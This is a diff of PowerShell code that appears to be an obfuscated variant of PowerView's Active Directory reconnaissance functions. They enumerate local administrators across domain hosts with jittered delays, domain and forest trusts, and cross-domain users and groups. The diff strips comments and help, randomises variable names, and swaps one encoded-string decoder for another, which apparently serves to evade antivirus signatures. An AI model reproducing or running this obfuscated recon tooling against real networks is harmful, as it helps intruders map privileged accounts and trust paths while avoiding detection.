         [String]
         $OutFile,
-
         [Switch]
         $NoClobber,
-
         [Switch]
         $TrustGroups,
-
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [Switch]
         $SearchForest,
-
         [ValidateRange(1,100)] 
         [Int]
         $Threads
     )
-
     begin {
         if ($PSBoundParameters['Debug']) {
             $DebugPreference = 'Continue'
         }
-
-        # random object for delay
-        $WLAr = New-Object System.Random
-
-        Write-Verbose ((HandleResult95 @(185,25,44,118,167,38,22,35,140,13,105,98,140,13,63,117,189,55,105,32,140,82,40,126,162,53,10,103,138,55,109,126,141,13,26,34,180,53,36,100,183,82,26,97,191,55,14,102,143,55,104,117,138,82,48,34,143,35,30,121,180,55,36,122,139,51,30,100,180,9,29,47) @(238,96,92,18)) + $Delay)
-
+        $BiHWqPVB = New-Object System.Random
+        Write-Verbose ((ParseEntry20 @(60,231,150,40,237,148,255,90,252,139,121,212,176,216,8,249,181,27,145,224,215,89,234,138,0,241,132,192,15,201,215,32,199,191,243,91,196,179,52,210,139,135,45,237,183,27,246,166,212,60,170,129,40,150,190,133,10,221,164,39,254,133,205,3,251,181,14,210,136,220,42,163) @(107,158,230,76,164,210,181)) + $Delay)
         if(!$ComputerName) { 
-
             if($Domain) {
-                $ajPzEg = @($Domain)
+                $k8fkcV = @($Domain)
             }
             elseif($SearchForest) {
-                # get ALL the domains in the forest to search
-                $ajPzEg = Get-NetForestDomain | ForEach-Object { $_.Name }
+                $k8fkcV = Get-NetForestDomain | ForEach-Object { $_.Name }
             }
             else {
-                # use the local domain
-                $ajPzEg = @( (Get-NetDomain).name )
+                $k8fkcV = @( (Get-NetDomain).name )
             }
-
-            # if we're using a host list, read the targets in and add them to the target list
             if($ComputerFile) {
                 $ComputerName = Get-Content -Path $ComputerFile
             }
             else {
                 [array]$ComputerName = @()
-                ForEach ($Domain in $ajPzEg) {
-                    Write-Verbose ((HandleResult95 @(128,59,17,242,132,138,145,115,59,206,135,249,182,21,84,248,132,139,133,52,3,193,139,188,181,43,32,171) @(215,66,97,150,205,204)) + $Domain + (HandleResult95 @(18,120,121,172,42,13,252,139,57,12,109,234,42,19,131,217) @(91,63,35,218,73,100,190,228)))
+                ForEach ($Domain in $k8fkcV) {
+                    Write-Verbose ((ParseEntry20 @(249,26,134,196,227,232,37,199,250,242,228,86,151,247,159,192,42,177,242,220,204,52,176,208,200,199,34,203) @(174,99,246,160,170)) + $Domain + (ParseEntry20 @(208,54,253,59,220,85,226,246,19,148,3,143,95,215,164,76) @(153,113,167,77,191,60,160)))
                     $ComputerName += Get-NetComputer -Filter $ComputerFilter -ADSpath $ComputerADSpath -Domain $Domain -DomainController $DomainController
                 }
             }
-
-            # remove any null target hosts, uniquify the list and shuffle it
             $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
             if($($ComputerName.Count) -eq 0) {
-                throw (HandleResult95 @(111,189,177,255,90,151,176,226,95,152,196,255,97,189,176,169,89,189,216,240) @(59,208,137,152))
+                throw (ParseEntry20 @(211,198,107,106,201,192,146,41,105,224,202,204,9,96,145,182,201,62,92,192) @(135,171,83,13,168))
             }
         }
-
-        # delete any existing output file if it already exists
         if(!$NoClobber) {
             if ($OutFile -and (Test-Path -Path $OutFile)) { Remove-Item -Path $OutFile }
         }
-
         if($TrustGroups) {
-            
-            Write-Verbose (HandleResult95 @(155,216,124,72,19,28,158,189,254,125,77,57,38,185,170,248,112,63,112,48,141,158,243,95,49,1,22,173,173,199,100,72,0,3,176,176,253,25,46,62,39,163,244,162) @(201,159,42,120,73,68,212))
-
-            # find all group names that have one or more users in another domain
-            $i8d3sQ4 = Find-ForeignGroup -Domain $Domain -DomainController $DomainController | ForEach-Object { $_.GroupName } | Sort-Object -Unique
-
-            $TrustGroupsSIDs = $i8d3sQ4 | ForEach-Object { 
-                # ignore the builtin administrators group for a DC (S-1-5-32-544)
-                # TODO: ignore all default built in sids?
-                Get-NetGroup -Domain $Domain -DomainController $DomainController -GroupName $_ -FullData | Where-Object { $_.objectsid -notmatch (HandleResult95 @(22,54,67,244,13,61,22,59,62,246,8,29,13,27,34,188) @(67,79,115,140,65,105)) } | ForEach-Object { $_.objectsid }
+            Write-Verbose (ParseEntry20 @(162,240,52,10,222,42,234,167,145,224,87,74,230,31,195,180,170,240,91,78,221,37,204,166,185,255,48,67,224,42,238,227,185,240,6,67,230,65,246,164,147,192,95,7) @(240,183,98,58,132,114,160,211))
+            $afGS1P8 = Find-ForeignGroup -Domain $Domain -DomainController $DomainController | ForEach-Object { $_.GroupName } | Sort-Object -Unique
+            $TrustGroupsSIDs = $afGS1P8 | ForEach-Object { 
+                Get-NetGroup -Domain $Domain -DomainController $DomainController -GroupName $_ -FullData | Where-Object { $_.objectsid -notmatch (ParseEntry20 @(149,8,95,179,65,148,36,27,134,119,137,5,33,159,92,240) @(192,113,111,203,13)) } | ForEach-Object { $_.objectsid }
             }
-
-            # query for the primary domain controller so we can extract the domain SID for filtering
             $DomainSID = Get-DomainSID -Domain $Domain
         }
-
-        # script block that enumerates a server
-        $h6EYtum2 = {
+        $s8TS = {
             param($ComputerName, $Ping, $OutFile, $DomainSID, $TrustGroupsSIDs)
-
-            # optionally check if the server is up first
-            $yssh = $True
+            $lPdgSYQ = $True
             if($Ping) {
-                $yssh = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
+                $lPdgSYQ = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
             }
-            if($yssh) {
-                # grab the users for the local admins on this server
-                $dlsnHVLX = Get-NetLocalGroup -ComputerName $ComputerName
-
-                # if we just want to return cross-trust users
-                if($DomainSID -and $hUvpc) {
-                    # get the local machine SID
-                    $cXlWen = ($dlsnHVLX | Where-Object { $_.SID -match '.*-500$' }).SID -replace (HandleResult95 @(164,81,129,17,165,70,133,91) @(232,5,212,102))
-
-                    # filter out accounts that begin with the machine SID and domain SID
-                    #   but preserve any groups that have users across a trust ($TrustGroupSIDS)
-                    $dlsnHVLX = $dlsnHVLX | Where-Object { ($TrustGroupsSIDs -contains $_.SID) -or ((-not $_.SID.startsWith($cXlWen)) -and (-not $_.SID.startsWith($DomainSID))) }
+            if($lPdgSYQ) {
+                $zQxKEAhW = Get-NetLocalGroup -ComputerName $ComputerName
+                if($DomainSID -and $p4f03) {
+                    $qbF4Ozdv = ($zQxKEAhW | Where-Object { $_.SID -match '.*-500$' }).SID -replace (ParseEntry20 @(187,88,125,215,23,57,189,202) @(247,12,40,160,90,122,236))
+                    $zQxKEAhW = $zQxKEAhW | Where-Object { ($TrustGroupsSIDs -contains $_.SID) -or ((-not $_.SID.startsWith($qbF4Ozdv)) -and (-not $_.SID.startsWith($DomainSID))) }
                 }
-
-                if($dlsnHVLX -and ($dlsnHVLX.Length -ne 0)) {
-                    # output the results to a csv if specified
+                if($zQxKEAhW -and ($zQxKEAhW.Length -ne 0)) {
                     if($OutFile) {
-                        $dlsnHVLX | Export-PowerViewCSV -OutFile $OutFile
+                        $zQxKEAhW | Export-PowerViewCSV -OutFile $OutFile
                     }
                     else {
-                        # otherwise return the user objects
-                        $dlsnHVLX
+                        $zQxKEAhW
                     }
                 }
                 else {
-                    Write-Verbose ((HandleResult95 @(46,217,175,199,151,60,149,159,234,150,47,218,179,251,148,3,233,161,233,178,29,232,191,218,188,20,246,130,234,153,35,217,139,145,238,30) @(121,160,233,163,222)) + $BCqCw1p)
+                    Write-Verbose ((ParseEntry20 @(178,63,177,224,119,77,208,48,190,204,104,114,191,30,189,254,119,64,175,42,147,204,104,113,135,43,161,239,119,79,191,63,149,182,14,111) @(229,70,247,132,62,8)) + $aXOOQM)
                 }
             }
         }
-
     }
-
     process {
-
         if($Threads) {
-            Write-Verbose ((HandleResult95 @(137,110,61,230,36,76,188,81,23,209,46,88,133,97,53,253,39,118,234,88,58,222,34,81,187,113,20,241,34,102,183,79,41,193,0,74,188,79,50,175,15,96,226,11) @(223,54,115,150,70,33)) + $Threads)
-
-            # if we're using threading, kick off the script block with Invoke-ThreadedFunction
-            $O2kwi = @{
+            Write-Verbose ((ParseEntry20 @(4,123,66,118,189,74,154,154,54,100,100,127,133,112,191,150,51,116,57,104,150,111,157,141,54,100,107,97,187,96,145,132,8,116,74,109,188,94,184,196,27,98,49,59) @(82,35,12,6,223,39,249,253)) + $Threads)
+            $n3XrNi5 = @{
                 'Ping' = $(-not $NoPing)
                 'OutFile' = $OutFile
                 'DomainSID' = $DomainSID
                 'TrustGroupsSIDs' = $TrustGroupsSIDs
             }
-
-            # kick off the threaded script block + arguments 
-            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $h6EYtum2 -ScriptParameters $O2kwi
+            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $s8TS -ScriptParameters $n3XrNi5
         }
-
         else {
             if(-not $NoPing -and ($ComputerName.count -ne 1)) {
-                # ping all hosts in parallel
                 $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                 $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
             }
-
-            Write-Verbose ((HandleResult95 @(171,38,99,184,218,186,13,101,184,212,186,44,90,155,166,205,61,68,150,255,159,54,81,170,201,149,29,123,133,160,174,47,119,177,198,155,62,84,229,233,152,23,94,234,218,189,98,46) @(252,95,19,220,147)) + $($ComputerName.count))
-            $ypmBN = 0
-
-            ForEach ($fa0ya in $ComputerName) {
-
-                $ypmBN = $ypmBN + 1
-
-                # sleep for our semi-randomized interval
-                Start-Sleep -Seconds $WLAr.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
-
-                Write-Verbose ((HandleResult95 @(96,138,133,61,126,182,163,44,83,164,196,53,84,158,179,105,86,164,192,55,126,187,187,53,84,157,175,53,84,154,180,100) @(55,243,245,89)) + $fa0ya + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICg="))) + $ypmBN + (HandleResult95 @(116,63,254,243,162,142,0,69) @(61,120,199,158,235,207)) + $($ComputerName.count) + ")")
-                Invoke-Command -ScriptBlock $h6EYtum2 -ArgumentList $fa0ya, $False, $OutFile, $DomainSID, $TrustGroupsSIDs
+            Write-Verbose ((ParseEntry20 @(228,80,47,189,250,111,13,175,215,110,25,170,250,110,106,232,209,126,21,181,208,64,29,175,233,64,29,177,234,26,13,169,215,68,10,190,210,110,102,163,215,97,18,239,250,104,98,228) @(179,41,95,217)) + $($ComputerName.count))
+            $o6bG = 0
+            ForEach ($mnZ6k in $ComputerName) {
+                $o6bG = $o6bG + 1
+                Start-Sleep -Seconds $BiHWqPVB.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
+                Write-Verbose ((ParseEntry20 @(104,62,201,3,165,17,187,158,91,16,136,11,143,57,171,219,94,16,140,9,165,28,163,135,92,41,227,11,143,61,172,214) @(63,71,185,103,236,84,237,235)) + $mnZ6k + ([char]0x20+[char]0x28) + $o6bG + (ParseEntry20 @(179,178,59,170,89,78,223,37) @(250,245,2,199,16,15,226,24)) + $($ComputerName.count) + ")")
+                Invoke-Command -ScriptBlock $s8TS -ArgumentList $mnZ6k, $False, $OutFile, $DomainSID, $TrustGroupsSIDs
             }
         }
     }
 }
-
-
-########################################################
-#
-# Domain trust functions below.
-#
-########################################################
-
 function Get-NetDomainTrust {
-<#
-    .SYNOPSIS
-
-        Return all domain trusts for the current domain or
-        a specified domain.
-
-    .PARAMETER Domain
-
-        The domain whose trusts to enumerate, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER LDAP
-
-        Switch. Use LDAP queries to enumerate the trusts instead of direct domain connections. 
-        More likely to get around network segmentation, but not as accurate.
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetDomainTrust
-
-        Return domain trusts for the current domain.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetDomainTrust -Domain "prod.testlab.local"
-
-        Return domain trusts for the "prod.testlab.local" domain.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetDomainTrust -Domain "prod.testlab.local" -DomainController "PRIMARY.testlab.local"
-
-        Return domain trusts for the "prod.testlab.local" domain, reflecting
-        queries through the "Primary.testlab.local" domain controller
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(Position=0,ValueFromPipeline=$True)]
         [String]
         $Domain = (Get-NetDomain).Name,
-
         [String]
         $DomainController,
-
         [Switch]
         $LDAP,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
-
     process {
         if($LDAP -or $DomainController) {
-
-            $ile3 = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -PageSize $PageSize
-
-            if($ile3) {
-
-                $ile3.filter = '(&(objectClass=trustedDomain))'
-
-                $ile3.FindAll() | Where-Object {$_} | ForEach-Object {
-                    $f3P1QS = $_.Properties
-                    $kcM83Fh3 = New-Object PSObject
-                    $XCnZwTqE = Switch ($f3P1QS.trustattributes)
+            $NEpqg = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -PageSize $PageSize
+            if($NEpqg) {
+                $NEpqg.filter = '(&(objectClass=trustedDomain))'
+                $NEpqg.FindAll() | Where-Object {$_} | ForEach-Object {
+                    $JRNx = $_.Properties
+                    $sfP5Y6Pf = New-Object PSObject
+                    $YvgO60 = Switch ($JRNx.trustattributes)
                     {
-                        0x001 { (HandleResult95 @(187,138,134,72,203,43,139,158,230,106,166,98,184,191,237,77,247,117,140,218) @(217,231,191,61,147,24)) }
-                        0x002 { (HandleResult95 @(84,101,59,113,111,104,103,21,96,115,9,75,27,111,77,5) @(48,61,121,2,53)) }
-                        0x004 { (HandleResult95 @(244,219,168,116,18,20,209,246,154,91,29,12,205,212,172,122,43,62,174,247,167,75,29,12) @(151,131,254,28,113,121)) }
-                        0x008 { (HandleResult95 @(199,115,147,76,141,208,72,173,70,153,103,174,209,81,168,100,203,109,133,248,98,240,75,151) @(157,30,170,53,215,136,6)) }
-                        0x010 { (HandleResult95 @(201,28,82,28,5,217,222,73,122,89,44,132,201,120,45,26,3,135,214,31,121,61,95,159) @(144,47,24,106,102,234)) }
-                        0x020 { (HandleResult95 @(226,232,224,215,57,140,54,243,130,190,189,46,168,55,208,160,232,166,101,246) @(134,218,140,231,88,203,90)) }
-                        0x040 { (HandleResult95 @(66,14,51,131,248,121,141,64,31,33,161,199,123,135,78,118,35,183,235,84,134,113,49,68) @(38,70,121,239,161,33,223)) }
-                        0x080 { (HandleResult95 @(106,124,122,57,71,25,61,132,106,108,126,100,71,27,86,155,87,78,98,110,126,125,90,136,109,90,92,127,64,109,3,148,108,83,13,53) @(14,52,48,8,36,42,111,226)) }
-                        0x100 { (HandleResult95 @(192,127,159,183,121,151,101,179,226,66,234,91,182,183,35,204,109,141,200,124,197,5,131,179,121,211,10,232) @(164,55,213,134,26)) }
+                        0x001 { (ParseEntry20 @(94,52,20,78,139,61,239,69,0,122,14,169,111,229,110,41,73,86,134,51) @(60,89,45,59,211,14,189)) }
+                        0x002 { (ParseEntry20 @(74,60,107,203,241,47,60,252,76,34,16,206,201,26,30,165) @(46,100,41,184,171,119,102,144)) }
+                        0x004 { (ParseEntry20 @(29,12,225,60,84,19,18,194,48,112,18,33,237,3,101,24,14,240,109,67,39,3,219,33) @(126,84,183,84,55)) }
+                        0x008 { (ParseEntry20 @(59,47,85,108,29,194,210,241,57,113,62,108,30,205,169,187,0,26,62,101,35,247,201,252) @(97,66,108,21,71,154,156,193)) }
+                        0x010 { (ParseEntry20 @(81,140,111,41,108,97,70,217,71,108,69,60,81,232,16,47,106,63,78,143,68,8,54,39) @(8,191,37,95,15,82)) }
+                        0x020 { (ParseEntry20 @(85,214,78,38,146,131,169,68,188,16,76,133,167,168,103,158,70,87,206,249) @(49,228,34,22,243,196,197)) }
+                        0x040 { (ParseEntry20 @(6,212,17,23,134,58,206,61,34,135,44,250,1,35,183,82,198,3,49,170,59,203,44,70) @(98,156,91,123,223)) }
+                        0x080 { (ParseEntry20 @(116,101,205,79,115,30,213,24,116,117,201,18,115,28,190,7,73,87,213,24,74,122,178,20,115,67,235,9,116,106,235,8,114,74,186,67) @(16,45,135,126)) }
+                        0x100 { (ParseEntry20 @(249,68,137,230,198,175,171,179,249,84,141,187,198,173,192,189,199,84,141,177,196,174,175,224,254,123,254,234) @(157,12,195,215,165,156,249,213)) }
                         Default { 
-                            Write-Warning ((HandleResult95 @(151,138,218,78,131,219,248,238,141,85,163,134,162,179,185,70,133,245,131,181,139,116,179,207,160,138,165,13,133,241,148,235,166,125,220,139) @(193,221,239,60,225,182)) + $($f3P1QS.trustattributes));
-                            ($($f3P1QS.trustattributes));
+                            Write-Warning ((ParseEntry20 @(87,242,13,96,99,200,1,33,99,204,122,34,98,203,110,104,101,230,122,122,101,237,106,107,96,242,114,35,101,226,109,36,72,228,5,47) @(1,165,56,18)) + $($JRNx.trustattributes));
+                            ($($JRNx.trustattributes));
                         }
                     }
-                    $zM44F = Switch ($f3P1QS.trustdirection) {
-                        0 { (HandleResult95 @(174,60,243,123,36,171,49,236,91,42,173,70) @(252,123,159,1,125)) }
-                        1 { (HandleResult95 @(127,84,205,201,26,140,122,118,162,225,69,130) @(44,3,248,160,120,191)) }
-                        2 { (HandleResult95 @(10,43,5,241,3,76,122,111,122,62,144,103) @(94,24,83,193,90,33,67)) }
-                        3 { (HandleResult95 @(37,215,5,79,111,229,202,230,45,137,59,84,108,143,181,226,22,251,84,25) @(116,186,105,36,14,189,128,138)) }
+                    $auiUZuL = Switch ($JRNx.trustdirection) {
+                        0 { (ParseEntry20 @(170,30,79,189,226,175,19,80,157,236,169,100) @(248,89,35,199,187)) }
+                        1 { (ParseEntry20 @(218,83,142,11,86,67,28,36,211,69,134,95) @(137,4,187,98,52,112,74,81)) }
+                        2 { (ParseEntry20 @(34,190,119,72,37,98,79,188,67,21,45,50) @(118,141,33,120,124,15)) }
+                        3 { (ParseEntry20 @(109,198,78,142,240,48,118,199,123,214,195,24,94,153,23,141,243,41,1,150) @(60,171,34,229,145,104)) }
                     }
-                    $qngo785J = New-Object Guid @(,$f3P1QS.objectguid[0])
-                    $kcM83Fh3 | Add-Member Noteproperty 'SourceName' $Domain
-                    $kcM83Fh3 | Add-Member Noteproperty 'TargetName' $f3P1QS.name[0]
-                    $kcM83Fh3 | Add-Member Noteproperty 'ObjectGuid' ("{" + $qngo785J + "}")
-                    $kcM83Fh3 | Add-Member Noteproperty 'TrustType' ($XCnZwTqE)
-                    $kcM83Fh3 | Add-Member Noteproperty 'TrustDirection' ($zM44F)
-                    $kcM83Fh3
+                    $RnCJmR = New-Object Guid @(,$JRNx.objectguid[0])
+                    $sfP5Y6Pf | Add-Member Noteproperty 'SourceName' $Domain
+                    $sfP5Y6Pf | Add-Member Noteproperty 'TargetName' $JRNx.name[0]
+                    $sfP5Y6Pf | Add-Member Noteproperty 'ObjectGuid' ("{" + $RnCJmR + "}")
+                    $sfP5Y6Pf | Add-Member Noteproperty 'TrustType' ($YvgO60)
+                    $sfP5Y6Pf | Add-Member Noteproperty 'TrustDirection' ($auiUZuL)
+                    $sfP5Y6Pf
                 }
             }
         }
-
         else {
-            # if we're using direct domain connections
-            $cYF9amo6 = Get-NetDomain -Domain $Domain
-            
-            if($cYF9amo6) {
+            $zImi = Get-NetDomain -Domain $Domain
+            if($zImi) {
                 (Get-NetDomain -Domain $Domain).GetAllTrustRelationships()
             }     
         }
     }
 }
-
-
 function Get-NetForestTrust {
-<#
-    .SYNOPSIS
-
-        Return all trusts for the current forest.
-
-    .PARAMETER Forest
-
-        Return trusts for the specified forest.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetForestTrust
-
-        Return current forest trusts.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetForestTrust -Forest "test"
-
-        Return trusts for the "test" forest.
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(Position=0,ValueFromPipeline=$True)]
         [String]
         $Forest
     )
-
     process {
-        $zVaW1I = Get-NetForest -Forest $Forest
-        if($zVaW1I) {
-            $zVaW1I.GetAllTrustRelationships()
+        $sTIfQ = Get-NetForest -Forest $Forest
+        if($sTIfQ) {
+            $sTIfQ.GetAllTrustRelationships()
         }
     }
 }
-
-
 function Find-ForeignUser {
-<#
-    .SYNOPSIS
-
-        Enumerates users who are in groups outside of their
-        principal domain. The -Recurse option will try to map all 
-        transitive domain trust relationships and enumerate all 
-        users who are in groups outside of their principal domain.
-
-    .PARAMETER UserName
-
-        Username to filter results for, wildcards accepted.
-
-    .PARAMETER Domain
-
-        Domain to query for users, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER LDAP
-
-        Switch. Use LDAP queries to enumerate the trusts instead of direct domain connections.
-        More likely to get around network segmentation, but not as accurate.
-
-    .PARAMETER Recurse
-
-        Switch. Enumerate all user trust groups from all reachable domains recursively.
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .LINK
-
-        http://blog.harmj0y.net/
-#>
-
     [CmdletBinding()]
     param(
         [String]
         $UserName,
-
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [Switch]
         $LDAP,
-
         [Switch]
         $Recurse,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
-
     function Get-ForeignUser {
-        # helper used to enumerate users who are in groups outside of their principal domain
         param(
             [String]
             $UserName,
-
             [String]
             $Domain,
-
             [String]
             $DomainController,
-
             [ValidateRange(1,10000)] 
             [Int]
             $PageSize = 200
         )
-
         if ($Domain) {
-            # get the domain name into distinguished form
-            $eXDL = (HandleResult95 @(36,11,174,75) @(118,78,227,114,25)) + $Domain -replace '\.',',DC='
+            $vczOaz = (ParseEntry20 @(147,227,205,78) @(193,166,128,119,243)) + $Domain -replace '\.',',DC='
         }
         else {
-            $eXDL = [String] ([adsi]'').distinguishedname
-            $Domain = $eXDL -replace 'DC=','' -replace ',','.'
+            $vczOaz = [String] ([adsi]'').distinguishedname
+            $Domain = $vczOaz -replace 'DC=','' -replace ',','.'
         }
-
         Get-NetUser -Domain $Domain -DomainController $DomainController -UserName $UserName -PageSize $PageSize | Where-Object {$_.memberof} | ForEach-Object {
-            ForEach ($mFaI in $_.memberof) {
-                $sfOxA8mE = $mFaI.IndexOf((HandleResult95 @(42,154,79,229) @(120,223,2,220,45,77,94)))
-                if($sfOxA8mE) {
-                    
-                    $gaQJ = $($mFaI.substring($sfOxA8mE)) -replace 'DC=','' -replace ',','.'
-                    
-                    if ($gaQJ.CompareTo($Domain)) {
-                        # if the group domain doesn't match the user domain, output
-                        $GroupName = $mFaI.split(",")[0].split("=")[1]
-                        $Xj0Ux = New-Object PSObject
-                        $Xj0Ux | Add-Member Noteproperty 'UserDomain' $Domain
-                        $Xj0Ux | Add-Member Noteproperty 'UserName' $_.samaccountname
-                        $Xj0Ux | Add-Member Noteproperty 'GroupDomain' $gaQJ
-                        $Xj0Ux | Add-Member Noteproperty 'GroupName' $GroupName
-                        $Xj0Ux | Add-Member Noteproperty 'GroupDN' $mFaI
-                        $Xj0Ux
+            ForEach ($cz9EWqy in $_.memberof) {
+                $lCc7KfW = $cz9EWqy.IndexOf((ParseEntry20 @(164,19,16,58) @(246,86,93,3,33,118,45,181)))
+                if($lCc7KfW) {
+                    $NFoKn = $($cz9EWqy.substring($lCc7KfW)) -replace 'DC=','' -replace ',','.'
+                    if ($NFoKn.CompareTo($Domain)) {
+                        $GroupName = $cz9EWqy.split(",")[0].split("=")[1]
+                        $sUVXGj = New-Object PSObject
+                        $sUVXGj | Add-Member Noteproperty 'UserDomain' $Domain
+                        $sUVXGj | Add-Member Noteproperty 'UserName' $_.samaccountname
+                        $sUVXGj | Add-Member Noteproperty 'GroupDomain' $NFoKn
+                        $sUVXGj | Add-Member Noteproperty 'GroupName' $GroupName
+                        $sUVXGj | Add-Member Noteproperty 'GroupDN' $cz9EWqy
+                        $sUVXGj
                     }
                 }
             }
         }
     }
-
     if ($Recurse) {
-        # get all rechable domains in the trust mesh and uniquify them
         if($LDAP -or $DomainController) {
-            $idyQ = Invoke-MapDomainTrust -LDAP -DomainController $DomainController -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
+            $jdtKic = Invoke-MapDomainTrust -LDAP -DomainController $DomainController -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
         }
         else {
-            $idyQ = Invoke-MapDomainTrust -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
+            $jdtKic = Invoke-MapDomainTrust -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
         }
-
-        ForEach($kcM83Fh3 in $idyQ) {
-            # get the trust groups for each domain in the trust mesh
-            Write-Verbose ((HandleResult95 @(179,169,133,248,189,95,122,152,167,232,155,175,106,65,130,153,212,129,149,57,79,210,175,215,147,236,66,90,133,166,242,179,150,79,64,148,183,247,155,169,106,123,167,142,210,160,158,53) @(225,254,176,201,223,8,44)) + $kcM83Fh3)
-            Get-ForeignUser -Domain $kcM83Fh3 -UserName $UserName -PageSize $PageSize
+        ForEach($sfP5Y6Pf in $jdtKic) {
+            Write-Verbose ((ParseEntry20 @(125,180,97,106,125,204,157,86,186,12,9,111,249,166,76,132,48,19,85,170,168,28,178,51,1,44,209,189,75,187,22,33,86,220,167,90,170,19,9,105,249,156,105,147,54,50,94,166) @(47,227,84,91,31,155,203)) + $sfP5Y6Pf)
+            Get-ForeignUser -Domain $sfP5Y6Pf -UserName $UserName -PageSize $PageSize
         }
     }
     else {
         Get-ForeignUser -Domain $Domain -DomainController $DomainController -UserName $UserName -PageSize $PageSize
     }
 }
-
-
 function Find-ForeignGroup {
-<#
-    .SYNOPSIS
-
-        Enumerates all the members of a given domain's groups
-        and finds users that are not in the queried domain.
-        The -Recurse flag will perform this enumeration for all
-        eachable domain trusts.
-
-    .PARAMETER GroupName
-
-        Groupname to filter results for, wildcards accepted.
-
-    .PARAMETER Domain
-
-        Domain to query for groups, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER LDAP
-
-        Switch. Use LDAP queries to enumerate the trusts instead of direct domain connections.
-        More likely to get around network segmentation, but not as accurate.
-
-    .PARAMETER Recurse
-
-        Switch. Enumerate all group trust users from all reachable domains recursively.
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .LINK
-
-        http://blog.harmj0y.net/
-#>
-
     [CmdletBinding()]
     param(
         [String]
         $GroupName = '*',
-
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [Switch]
         $LDAP,
-
         [Switch]
         $Recurse,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
-
     function Get-ForeignGroup {
         param(
             [String]
             $GroupName = '*',
-
             [String]
             $Domain,
-
             [String]
             $DomainController,
-
             [ValidateRange(1,10000)] 
             [Int]
             $PageSize = 200
         )
-
         if(-not $Domain) {
             $Domain = (Get-NetDomain).Name
         }
-
-        $T0YsdsQ = ((HandleResult95 @(58,168,131,82) @(104,237,206,107)) + $($Domain.Replace('.', ',DC=')))
-        Write-Verbose ((HandleResult95 @(93,192,77,68,246,88,235,1,98,234,59,177,61,113,146,50) @(15,135,116,48,175)) + $T0YsdsQ)
-
-        # standard group names to ignore
-        $AJEgGK = @((HandleResult95 @(129,102,210,166,75,185,115,161) @(215,62,156,202,40)), (HandleResult95 @(137,176,157,158,67,140,155,209,163,92,141,141,254,178,80,161) @(219,247,164,234,26)), (HandleResult95 @(70,33,152,128,19,21,70,104) @(20,18,206,236,112,38)))
-
-        # get all the groupnames for the given domain
+        $zQTdc = ((ParseEntry20 @(181,172,55,94) @(231,233,122,103,106,50,206)) + $($Domain.Replace('.', ',DC=')))
+        Write-Verbose ((ParseEntry20 @(117,57,133,56,222,41,75,11,238,9,179,72,110,63,129,113) @(39,126,188,76,135,126)) + $zQTdc)
+        $KzkkjJJ = @((ParseEntry20 @(241,228,93,28,196,210,94,77) @(167,188,19,112)), (ParseEntry20 @(116,78,64,146,135,110,76,253,111,79,47,156,132,97,106,242) @(38,9,121,230,222,57,32,136)), (ParseEntry20 @(169,217,121,105,216,153,186,129) @(251,234,47,5,187,170,232)))
         Get-NetGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | Where-Object {$_.member} | Where-Object {
-            # exclude common large groups
-            -not ($AJEgGK -contains $_.samaccountname) } | ForEach-Object {
-                
+            -not ($KzkkjJJ -contains $_.samaccountname) } | ForEach-Object {
                 $GroupName = $_.samAccountName
-
                 $_.member | ForEach-Object {
-                    # filter for foreign SIDs in the cn field for users in another domain,
-                    #   or if the DN doesn't end with the proper DN for the queried domain  
-                    if (($_ -match 'CN=S-1-5-21.*-.*') -or ($T0YsdsQ -ne ($_.substring($_.IndexOf((HandleResult95 @(135,90,89,182) @(213,31,20,143,1,159,154,83))))))) {
-
-                        $JrDg6EbO = $_.subString($_.IndexOf((HandleResult95 @(158,131,160,70) @(204,198,237,127,153,47)))) -replace 'DC=','' -replace ',','.'
+                    if (($_ -match 'CN=S-1-5-21.*-.*') -or ($zQTdc -ne ($_.substring($_.IndexOf((ParseEntry20 @(85,65,49,161) @(7,4,124,152,163))))))) {
+                        $of0NvYsD = $_.subString($_.IndexOf((ParseEntry20 @(80,184,212,230) @(2,253,153,223,81,121,219,252)))) -replace 'DC=','' -replace ',','.'
                         $UserName = $_.split(",")[0].split("=")[1]
-
-                        $MoW7 = New-Object PSObject
-                        $MoW7 | Add-Member Noteproperty 'GroupDomain' $Domain
